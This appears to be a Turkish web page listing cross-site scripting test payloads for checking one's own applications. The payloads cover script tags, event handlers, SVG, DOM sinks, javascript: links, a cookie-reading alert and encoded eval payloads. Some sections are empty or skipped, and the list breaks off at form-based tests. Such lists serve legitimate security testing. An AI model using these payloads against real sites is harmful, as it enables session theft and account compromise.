Bu sayfa, web uygulamalarınızın XSS saldırılarına karşı dayanıklılığını test etmek için tasarlanmıştır. Her test kategorisi, farklı XSS vektörlerini ve tekniklerini içerir.

1. Temel XSS Testleri

1.1 Basit Script Enjeksiyonu

<script>alert('XSS Test')</script>

1.2 IMG Onerror

<img src=x onerror="alert('IMG XSS')">

1.3 Body Onload

<body onload=alert('Body Onload XSS')>

2. Olay İşleyici Tabanlı XSS

2.1 OnClick

<div onclick="alert('onClick XSS')">Tıkla</div>

2.2 OnMouseOver

<div onmouseover="alert('onMouseOver XSS')">Üzerine gel</div>

2.3 OnFocus

<input onfocus="alert('onFocus XSS')" autofocus>

3. SVG Tabanlı XSS

3.1 SVG OnLoad

<svg onload="alert('SVG XSS')"></svg>

3.2 SVG Script

<svg><script>alert('SVG Script')</script></svg>

4. DOM Tabanlı XSS

4.1 document.write

document.write('<script>alert("DOM XSS")</script>')

4.2 innerHTML

element.innerHTML = '<img src=x onerror=alert("innerHTML XSS")>'

4.3 document.cookie

alert(document.cookie)

5. JavaScript Protokol XSS

5.1 Href JavaScript

<a href="javascript:alert('XSS')">Tıkla</a>

5.2 IFrame SRC

6.1 HTML Entity Encoding

<script>\u0061\u006c\u0065\u0072\u0074('XSS')</script>

6.3 Base64 Encoding

<img src=x onerror="eval(atob('YWxlcnQoJ1hTUycp'))">

7. Form Tabanlı XSS

7.1 Input Value
